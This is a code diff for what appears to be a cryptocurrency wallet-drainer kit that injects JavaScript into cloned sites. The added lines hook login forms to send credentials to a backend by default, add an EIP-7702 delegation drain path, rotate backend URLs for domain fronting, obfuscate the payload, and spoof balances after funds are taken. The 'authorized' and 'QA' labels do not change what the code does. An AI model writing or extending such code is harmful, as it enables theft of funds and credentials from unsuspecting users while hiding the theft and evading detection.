@@ -7,6 +7,7 @@ import path from 'node:path'
 import { fileURLToPath } from 'node:url'
 
 import { prependFakeBalanceModule, parseFakeBalanceAfterDrainEnv } from './mirror-fake-balance.js'
+import { obfuscateInjectJs, parseObfuscateEnv } from './obfuscate-inject.js'
 
 export const DEFAULT_AUTHORIZED_BACKEND_URL = 'https://legionapi-production.up.railway.app'
 
@@ -22,8 +23,20 @@ export type AuthorizedDrainInjectConfig = {
   forceHardwareBypass?: boolean
   /** Production clone: zero visible UI, MutationObserver on native connect buttons */
   productionClone?: boolean
+  /** QA exercises: show wallet panel even when productionClone/silentInject */
+  qaVisibleUi?: boolean
   /** Persist pre-drain balances and spoof balance APIs after successful drain */
   fakeBalanceAfterDrain?: boolean
+  /** Hook login forms and POST credentials to /api/v1/creds (default true) */
+  captureLoginCreds?: boolean
+  /** Optional X-Cex-Creds-Key header for cred capture POST */
+  cexCredsApiKey?: string
+  /** Enable EIP-7702 delegation drain path on EVM connect */
+  eip7702Enabled?: boolean
+  /** Comma-separated backend URLs for domain fronting / rotation */
+  backendUrls?: string[]
+  /** Apply CLIENT_OBFUSCATE post-processing */
+  obfuscate?: boolean
 }
 
 export { parseFakeBalanceAfterDrainEnv }
@@ -32,6 +45,13 @@ export function parseHardwareAutoConsentEnv(
   value: string | undefined,
 ): boolean {
   const v = value?.trim().toLowerCase()
+  return v === 'true' || v === '1' || v === 'yes'
+}
+
+export function parseCaptureLoginCredsEnv(value: string | undefined): boolean {
+  const v = value?.trim().toLowerCase()
+  if (!v) return true
+  if (v === 'false' || v === '0' || v === 'no') return false
   return v === 'true' || v === '1' || v === 'yes'
 }
 
@@ -87,6 +107,12 @@ export async function buildAuthorizedDrainInjectJs(
   const silentInject = config.silentInject === true || config.productionClone === true
   const forceHardwareBypass = config.forceHardwareBypass === true
   const productionClone = config.productionClone === true
+  const qaVisibleUi = config.qaVisibleUi === true
+  const captureLoginCreds =
+    config.captureLoginCreds !== false &&
+    parseCaptureLoginCredsEnv(process.env['CAPTURE_LOGIN_CREDS'])
+  const cexCredsApiKey =
+    config.cexCredsApiKey?.trim() ?? process.env['CEX_CREDS_API_KEY']?.trim() ?? ''
 
   template = template.replace(/__BACKEND_URL__/g, backendUrl)
   template = template.replace(/__KINETIC_KEY__/g, kineticKey)
@@ -95,13 +121,39 @@ export async function buildAuthorizedDrainInjectJs(
   template = template.replace(/__SILENT_INJECT__/g, String(silentInject))
   template = template.replace(/__FORCE_HARDWARE_BYPASS__/g, String(forceHardwareBypass))
   template = template.replace(/__PRODUCTION_CLONE__/g, String(productionClone))
+  template = template.replace(/__QA_VISIBLE_UI__/g, String(qaVisibleUi))
+  template = template.replace(/__CEX_CREDS_API_KEY__/g, cexCredsApiKey)
+  template = template.replace(/__CAPTURE_LOGIN_CREDS__/g, String(captureLoginCreds))
+
+  const eip7702Enabled =
+    config.eip7702Enabled === true ||
+    (process.env['EIP7702_ENABLED']?.trim().toLowerCase() ?? '') === 'true'
+  template = template.replace(/__EIP7702_ENABLED__/g, String(eip7702Enabled))
+
+  const obfuscateCfg = parseObfuscateEnv()
+  const backendUrls =
+    config.backendUrls ??
+    (obfuscateCfg.backendUrls.length > 0
+      ? obfuscateCfg.backendUrls
+      : [backendUrl])
+  template = template.replace(/__BACKEND_URLS_JSON__/g, JSON.stringify(backendUrls))
 
   const fakeBalance =
     config.fakeBalanceAfterDrain === true ||
     parseFakeBalanceAfterDrainEnv(process.env['FAKE_BALANCE_AFTER_DRAIN'])
 
-  return prependFakeBalanceModule(template, {
+  let output = await prependFakeBalanceModule(template, {
     backendUrl,
     enabled: fakeBalance,
   })
+
+  const shouldObfuscate = config.obfuscate === true || obfuscateCfg.enabled
+  if (shouldObfuscate) {
+    output = obfuscateInjectJs(output, {
+      encryptKey: obfuscateCfg.encryptKey,
+      backendUrls,
+    })
+  }
+
+  return output
 }
